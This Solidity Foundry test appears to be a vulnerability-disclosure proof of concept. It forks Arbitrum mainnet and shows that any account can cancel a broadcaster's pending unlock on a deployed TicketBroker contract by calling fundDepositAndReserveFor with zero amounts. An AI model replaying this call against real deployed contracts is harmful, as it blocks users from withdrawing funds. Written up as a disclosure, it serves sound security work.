pragma solidity ^0.8.9;

import "ds-test/test.sol";
import "./base/GovernorBaseTest.sol";
import "contracts/pm/TicketBroker.sol";
import "./interfaces/ICheatCodes.sol";

// forge test --match-contract TicketBrokerForceCancelUnlockPoC --fork-url https://arbitrum-mainnet.infura.io/v3/<INFURA_KEY> -vvv --fork-block-number 121404685
contract TicketBrokerForceCancelUnlockPoC is GovernorBaseTest {
    TicketBroker public constant TICKET_BROKER = TicketBroker(0xa8bB618B1520E284046F3dFc448851A1Ff26e41B);

    uint256 public testAccountCtr = 1;
    address public attacker;
    address public broadcaster;

    function newAddr() public returns (address) {
        address addr = CHEATS.addr(testAccountCtr);
        testAccountCtr++;
        return addr;
    }

    function setUp() public {
        // Setup accounts
        attacker = newAddr();
        broadcaster = newAddr();

        uint256 mockBalance = 1000;

        CHEATS.deal(attacker, mockBalance);
        CHEATS.deal(broadcaster, mockBalance);
    }

    function testFundDepositAndReserveForPoC() public {
        // Broadcaster calls fundDepositAndReserve()
        CHEATS.startPrank(broadcaster);
        TICKET_BROKER.fundDepositAndReserve{ value: 1000 }(500, 500);

        // Broadcaster calls unlock() to initiate unlock period
        TICKET_BROKER.unlock();
        CHEATS.stopPrank();
        assertTrue(TICKET_BROKER.isUnlockInProgress(broadcaster));

        // Attacker calls fundDepositAndReserveFor() to forcefully cancel the broadcaster's unlock period
        CHEATS.prank(attacker);
        // Note: The attacker does not need to add ETH to the broadcaster's deposit/reserve and only needs to pay gas fees for the attack
        TICKET_BROKER.fundDepositAndReserveFor(broadcaster, 0, 0);
        assertTrue(!TICKET_BROKER.isUnlockInProgress(broadcaster));
    }
}
